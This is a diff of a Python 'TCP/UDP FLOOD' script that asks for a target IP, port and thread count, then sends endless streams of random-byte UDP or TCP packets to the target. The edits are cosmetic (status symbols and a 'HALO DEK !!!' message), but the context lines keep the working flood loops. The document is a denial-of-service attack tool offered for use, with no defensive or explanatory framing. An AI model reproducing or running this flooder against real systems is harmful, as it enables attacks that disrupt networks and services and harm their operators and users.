@@ -9,24 +9,24 @@ print("#-- TCP/UDP FLOOD --#")
 ip = str(input(" IP :"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
-times = int(input(" Packets per one connection:"))
+times = int(input(" Packets per connection:"))
 threads = int(input(" Threads:"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[♤]","[♧]","[♡]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" HALO DEK !!!")
 		except:
 			print("[!] Error!!!")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[♤]","[♧]","[♡]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -34,7 +34,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" HALO DEK !!!")
 		except:
 			s.close()
 			print("[*] Error")
